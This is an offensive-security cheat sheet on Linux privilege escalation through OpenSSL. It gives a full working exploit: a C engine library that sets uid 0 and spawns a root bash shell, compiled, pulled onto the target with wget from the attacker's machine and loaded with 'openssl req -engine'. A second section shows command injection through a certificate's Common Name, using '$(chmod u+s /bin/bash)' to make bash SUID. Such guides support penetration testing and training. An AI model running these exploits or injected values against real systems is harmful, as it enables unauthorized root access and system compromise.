# OpenSSL Privilege Escalation

### Privilege Escalation (SUID) <a href="#privilege-escalation-suid" id="privilege-escalation-suid"></a>

Reference: [https://chaudhary1337.github.io/p/how-to-openssl-cap\_setuid-ep-privesc-exploit/](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/)

#### 1. Get Capabilities <a href="#id-1-get-capabilities" id="id-1-get-capabilities"></a>

Chack capabilities in the target machine.

```shellscript
# -r: recursive
getcap -r / 2>/dev/null
```

If you see the openssl has the capability set as below, you can successfully exploit it.

```shellscript
/usr/bin/openssl = cap_setuid+ep
```

#### 2. Create the Exploit in C <a href="#id-2-create-the-exploit-in-c" id="id-2-create-the-exploit-in-c"></a>

In local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.\
If you don't have it yet, install it.

```shellscript
sudo apt install libssl-dev
```

Then create "exploit.c".

```shellscript
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Now compile it using gcc.

```shellscript
# -fPIC: for generating a shared object (PIC: Position Independent Code)
# -c: compile and assemble, but do not link.
gcc -fPIC -o exploit.o -c exploit.c
# -shared: create a shared library.
gcc -shared -o exploit.so -lcrypto exploit.o
```

#### 3. Get the Root Shell <a href="#id-3-get-the-root-shell" id="id-3-get-the-root-shell"></a>

Transfer the "exploit.so" to the target machine.

```
wget http://<local-ip>:8000/exploit.so
```

Run the exploit and finally you should get the root shell.

```shellscript
# req: PKCS#10 X.509 Certificate Signing Request (CSR) Management.
# engine: Engine (loadable module) information and manipulation.
openssl req -engine ./exploit.so
```

### Command Injection in Subject <a href="#command-injection-in-subject" id="command-injection-in-subject"></a>

```
openssl x509 -in /opt/example.crt -noout -subject
```

If the above command is executed by root and use values of subjects in any way, we might be able to execute arbitrary command as root.

#### Exploitation <a href="#exploitation" id="exploitation"></a>

For example, create a certificate that contains the malicious subject value.\
When the prompt asks us to enter values, we can insert arbitrary command.

```shellscript
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /opt/example.key -out /opt/example.crt -days 1

...
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
...
```

Then some shell script, that uses the subject values, is executed as root, our command (**`$(chmod u+s /bin/bash)`**) may be executed as root.
